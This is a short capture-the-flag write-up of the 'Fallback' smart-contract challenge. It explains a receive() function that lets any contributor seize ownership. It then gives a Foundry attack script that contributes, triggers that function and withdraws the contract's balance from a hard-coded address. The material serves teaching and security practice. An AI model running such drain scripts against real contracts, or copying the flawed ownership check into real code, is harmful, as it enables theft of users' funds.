# Fallback   
We have a contract where users can make contributions and withdraw their contributions. Our mission is to become the owner of the contract and reduce its balance to 0.   
Upon inspecting the contract, I noticed a `receive`  function that allows us to become the owner:
   
```solidity
receive() external payable {
     require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender; }
```
This function checks that the value sent in the transaction is greater than 0 and that the sender's contributions are also greater than 0.   
To solve this challenge, we need to:   
1. Make a transaction to contribute, ensuring that `contributions[msg.sender]` is greater than 0.   
2. Call the `receive` function to become the owner.   
3. Call the `withdraw` function to drain all the funds.   
   
I wrote a script to automate solving this challenge:   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

interface test {
    function contribute() external payable;

    function withdraw() external;
}

contract AttackScript is Script {
    address victim;

    constructor() {
        victim = 0x0507575a8Bf69441e5282c82c2e541cf21cE2d9e;
    }

    function run() external {
        vm.startBroadcast();
        test(victim).contribute{value: 0.0001 ether}();
        victim.call{value: 0.00001 ether}("");
        test(victim).withdraw();
        vm.stopBroadcast();
    }
}
```
